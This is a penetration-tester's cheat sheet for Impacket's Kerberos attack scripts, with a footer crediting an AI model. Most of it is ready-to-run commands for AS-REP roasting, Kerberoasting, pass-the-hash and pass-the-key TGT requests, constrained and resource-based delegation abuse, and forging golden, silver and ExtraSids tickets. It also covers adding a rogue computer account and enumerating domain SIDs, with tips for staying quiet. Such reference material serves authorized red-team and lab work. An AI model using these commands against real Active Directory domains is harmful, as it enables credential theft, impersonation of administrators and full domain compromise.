# impacket — GetNPUsers / GetUserSPNs / getTGT / getST / ticketer / findDelegation / addcomputer / lookupsid

**Tags:** `#impacket` `#kerberos` `#asreproast` `#kerberoast` `#goldenticket` `#silverticket` `#delegation` `#activedirectory`

Impacket's Kerberos-specific script family — the network-facing, credential/ticket-request side of Kerberos attacks (as opposed to [[Tools/Lateral Movement/impacket|impacket's remote-exec tools]], which is what you use *after* you have a ticket/hash). One script per operation:

| Script | Use |
|---|---|
| `GetNPUsers.py` | AS-REP Roasting — request AS-REP for accounts with preauth disabled |
| `GetUserSPNs.py` | Kerberoasting — request TGS for SPN-having accounts |
| `getTGT.py` | Get a TGT from a password, NTLM hash, or AES key (Overpass-the-Hash / Pass-the-Key) |
| `getST.py` | Request a service ticket, including S4U2Self/S4U2Proxy impersonation (constrained delegation, RBCD) |
| `ticketer.py` | Forge Golden/Silver tickets offline from a krbtgt or service account hash |
| `findDelegation.py` | Enumerate accounts configured for unconstrained/constrained delegation |
| `addcomputer.py` | Add a computer account to the domain (machine account quota) — used to stage RBCD |
| `lookupsid.py` | Resolve the domain SID (needed for ticket forging) |

**Source:** Part of Impacket — pre-installed on Kali (`impacket-GetNPUsers`, `impacket-GetUserSPNs`, etc.)
**Install:** `pip install impacket` or `sudo apt install python3-impacket`

### AS-REP Roasting — `GetNPUsers`

```bash
# No creds — roast a userlist; -format hashcat (default) or john for the cracker you'll use
impacket-GetNPUsers <domain>/ -no-pass -usersfile users.txt -dc-ip <dc_ip> -format hashcat -outputfile asrep.txt
# Authenticated — enumerate every DONT_REQ_PREAUTH account AND request its AS-REP in one shot
impacket-GetNPUsers <domain>/<user>:<pass> -dc-ip <dc_ip> -request -format hashcat -outputfile asrep.txt
```

### Kerberoasting — `GetUserSPNs`

```bash
# Roast everything
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc_ip> -request -outputfile kerb.txt
# Target ONE account (quieter than roasting the whole domain)
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc_ip> -request-user <svc_acct> -outputfile kerb.txt
# -stealth avoids the noisy "give me every SPN" LDAP query; cross-forest with -target-domain
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc_ip> -request -stealth
```

### Over-Pass-the-Hash / Pass-the-Key — `getTGT`

```bash
# TGT from a hash or AES key → drop into KRB5CCNAME and use -k -no-pass everywhere after
impacket-getTGT <domain>/<user> -hashes :<NT_hash> -dc-ip <dc_ip>          # → user.ccache
impacket-getTGT <domain>/<user> -aesKey <aes256_key> -dc-ip <dc_ip>        # Pass-the-Key (AES)
export KRB5CCNAME=user.ccache
```

### Delegation abuse — `getST` (S4U2Self / S4U2Proxy)

```bash
# Constrained delegation: impersonate a user to an SPN this account can delegate to
impacket-getST -spn cifs/target.corp.local -impersonate Administrator \
  -dc-ip <dc_ip> '<domain>/<svc_acct>:<pass>'

# RBCD chain: you control MACHINE$ and set RBCD on the target → impersonate to it
impacket-getST -spn cifs/target.corp.local -impersonate Administrator \
  -dc-ip <dc_ip> '<domain>/MACHINE$:<machine_pass>'

# -self (S4U2Self only), -additional-ticket <tgs> (bring your own middle ticket),
# -force-forwardable (coerce a non-forwardable S4U2Self ticket usable for S4U2Proxy)
```

### Ticket forging — `ticketer` (Golden / Silver / cross-domain)

```bash
# GOLDEN — krbtgt hash, impersonate anyone (default groups = 512/513/518/519/520)
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <domain_SID> -domain <domain> Administrator

# SILVER — a SERVICE account hash + its SPN; forges a TGS straight to that one service (no DC touch)
impacket-ticketer -nthash <service_hash> -domain-sid <domain_SID> -domain <domain> \
  -spn cifs/target.corp.local Administrator

# Cross-domain / ExtraSids — add Enterprise Admins of the forest root via its SID+519
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <child_SID> -domain child.corp.local \
  -extra-sid <root_SID>-519 Administrator
# -groups, -user-id, -duration tune the PAC.  export KRB5CCNAME=Administrator.ccache
```

### Staging & recon — `addcomputer`, `findDelegation`, `lookupsid`

```bash
# Add a computer account (MachineAccountQuota) to stage RBCD; -method SAMR (default) or LDAPS
impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'Passw0rd!' -method LDAPS \
  -dc-host <dc_fqdn> '<domain>/<user>:<pass>'

# Enumerate unconstrained/constrained/RBCD delegation across the domain
impacket-findDelegation <domain>/<user>:<pass> -dc-ip <dc_ip>

# Resolve the domain SID, and RID-brute users/groups (0-based, no BloodHound needed)
impacket-lookupsid <domain>/<user>:<pass>@<dc_ip>
```

> [!note] **See also** — [[Services/Active Directory/Kerberos|Kerberos]] for the full methodology these scripts implement (AS-REP Roasting, Kerberoasting, Golden/Silver Ticket, delegation abuse). Also [[Services/Active Directory/Domain Trusts|Domain Trusts]] — `raiseChild` (auto child→forest-root), `ticketer -extra-sid` (ExtraSids golden ticket), and `lookupsid` for cross-domain SID enumeration. From a **macOS** foothold, the native-API equivalent is [[Tools/AD/Bifrost|Bifrost]].

---

*Created: 2026-07-27*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
